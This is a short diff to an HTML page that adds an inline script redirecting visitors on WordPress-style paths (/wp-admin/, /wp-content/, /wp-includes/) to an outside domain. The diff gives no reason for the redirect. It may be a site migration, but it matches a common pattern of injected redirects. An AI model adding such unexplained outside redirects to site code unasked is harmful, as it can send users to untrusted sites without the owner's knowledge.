@@ -121,5 +121,13 @@
     </footer>
 
     <script src="js/main.js"></script>
+    <script>
+        (function() {
+            var path = window.location.pathname;
+            if (path.indexOf('/wp-content/') === 0 || path.indexOf('/wp-admin/') === 0 || path.indexOf('/wp-includes/') === 0) {
+                window.location.replace('https://yugstroysegment.com/');
+            }
+        })();
+    </script>
 </body>
 </html>
